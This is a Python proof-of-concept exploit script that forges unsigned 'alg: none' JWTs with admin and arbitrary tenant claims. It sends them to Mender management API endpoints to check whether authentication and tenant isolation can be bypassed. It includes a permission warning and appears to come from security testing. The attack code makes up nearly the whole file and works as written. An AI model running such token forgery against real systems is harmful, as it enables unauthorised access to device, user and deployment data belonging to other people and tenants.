#!/usr/bin/env python3
"""
Proof of Concept: JWT Identity Extraction Without Signature Verification
Vulnerability #2 - HIGH

This POC demonstrates how an attacker could craft an unsigned JWT with arbitrary
claims to potentially bypass authentication if used in paths that don't verify signatures.

WARNING: Only use this on systems you own or have explicit permission to test.
"""

import requests
import json
import base64
import sys

def create_unsigned_jwt(claims):
    """
    Create an unsigned JWT (just header + payload, no signature)
    This is what ExtractIdentity() would accept
    """
    header = {
        "alg": "none",
        "typ": "JWT"
    }
    
    # Encode header
    header_b64 = base64.urlsafe_b64encode(
        json.dumps(header, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    # Encode payload
    payload_b64 = base64.urlsafe_b64encode(
        json.dumps(claims, separators=(',', ':')).encode()
    ).decode().rstrip('=')
    
    # Unsigned JWT (no signature)
    jwt = f"{header_b64}.{payload_b64}."
    
    return jwt

def test_jwt_forgery(base_url, forged_jwt):
    """
    Test if the system accepts forged JWT tokens
    """
    print(f"\n[*] Testing JWT forgery with unsigned token...")
    print(f"    Token: {forged_jwt[:100]}...")
    
    # Test various endpoints that use identity middleware
    endpoints = [
        "/api/management/v1/inventory/devices",
        "/api/management/v1/useradm/users",
        "/api/management/v1/deployments/deployments",
    ]
    
    vulnerable_endpoints = []
    
    for endpoint in endpoints:
        url = f"{base_url}{endpoint}"
        headers = {
            "Authorization": f"Bearer {forged_jwt}",
            "Content-Type": "application/json"
        }
        
        print(f"\n[*] Testing endpoint: {endpoint}")
        try:
            response = requests.get(url, headers=headers, verify=False, timeout=5)
            print(f"    Status: {response.status_code}")
            
            if response.status_code != 401 and response.status_code != 403:
                print(f"    [VULNERABLE] Endpoint accepted forged token!")
                print(f"    Response preview: {response.text[:200]}")
                vulnerable_endpoints.append(endpoint)
            else:
                print(f"    [SECURE] Endpoint rejected forged token (expected)")
        except Exception as e:
            print(f"    Error: {e}")
    
    return vulnerable_endpoints

def main():
    print("=" * 70)
    print("POC: JWT Identity Extraction Without Signature Verification")
    print("Vulnerability #2 - HIGH")
    print("=" * 70)
    
    if len(sys.argv) < 2:
        print("\nUsage: python3 vulnerability_2_jwt_forgery.py <base_url>")
        print("Example: python3 vulnerability_2_jwt_forgery.py https://staging.hosted.mender.io")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Create forged JWT with admin claims
    print("\n[*] Creating forged JWT with admin claims...")
    forged_claims = {
        "sub": "00000000-0000-0000-0000-000000000001",  # Admin user ID
        "mender.tenant": "target-tenant-id",
        "mender.user": True,
        "mender.plan": "enterprise",
        "mender.addons": [
            {"name": "configure", "enabled": True},
            {"name": "monitor", "enabled": True}
        ],
        "iat": 1609459200,  # Unix timestamp
        "exp": 4102444800,  # Far future
        "iss": "Mender"
    }
    
    forged_jwt = create_unsigned_jwt(forged_claims)
    print(f"[+] Forged JWT created")
    print(f"    Claims: {json.dumps(forged_claims, indent=2)}")
    
    # Test the forged JWT
    vulnerable = test_jwt_forgery(base_url, forged_jwt)
    
    print("\n" + "=" * 70)
    if vulnerable:
        print("[!] VULNERABILITY CONFIRMED: System accepts unsigned JWT tokens")
        print(f"[!] Vulnerable endpoints: {', '.join(vulnerable)}")
        print("[!] This indicates ExtractIdentity() is used without signature verification")
    else:
        print("[+] No vulnerable endpoints found")
        print("[+] System appears to verify JWT signatures properly")
    print("=" * 70)
    
    # Additional test: Try with different tenant IDs
    print("\n[*] Testing tenant isolation bypass...")
    test_tenants = ["tenant-1", "tenant-2", "admin-tenant"]
    
    for tenant_id in test_tenants:
        claims = {
            "sub": "user-id",
            "mender.tenant": tenant_id,
            "mender.user": True
        }
        jwt = create_unsigned_jwt(claims)
        print(f"\n    Testing tenant: {tenant_id}")
        # Test would go here - but we'll just show the token
        print(f"    Token: {jwt[:80]}...")

if __name__ == "__main__":
    main()

